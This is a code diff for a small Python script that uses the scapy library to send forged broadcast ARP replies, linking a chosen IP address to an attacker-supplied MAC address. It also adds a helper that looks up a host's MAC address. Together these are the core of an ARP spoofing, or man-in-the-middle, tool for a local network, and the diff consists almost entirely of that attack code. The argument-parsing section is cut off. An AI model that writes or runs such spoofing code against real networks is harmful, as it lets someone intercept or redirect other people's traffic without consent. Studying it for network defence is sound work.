@@ -2,14 +2,20 @@
 from scapy.all import *
 
 
-def spoof(spoof_ip, spoof_mac):        
-    packet = Ether(src=spoof_mac,  dst="ff:ff:ff:ff:ff:ff")/ ARP(op=2, pdst="10.0.0.0/24",psrc=spoof_ip)    
-    scapy.send(packet)
+def spoof(ip, hwsrc):            
+    arp=ARP(op=2,psrc=ip,hwsrc=hwsrc)
+    eth=Ether(dst="ff:ff:ff:ff:ff:ff",src=hwsrc)
+    pkt = eth/arp
+    ans=srp1(pkt,timeout=1)
+    return ans
 
-def get_mac_localhost():
-    ans = ARP(pdst="127.0.0.1")
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.5"), timeout=2)
-    
+def get_mac(ip):
+    arp=ARP(op=1,pdst=ip)
+    eth = Ether(dst = "ff:ff:ff:ff:ff:ff")
+    pkt = eth/arp
+    ans = srp1(pkt, timeout = 1, verbose = False)
+    return ans
+ 
 def main():
     if __name__ == '__main__':
         import argparse
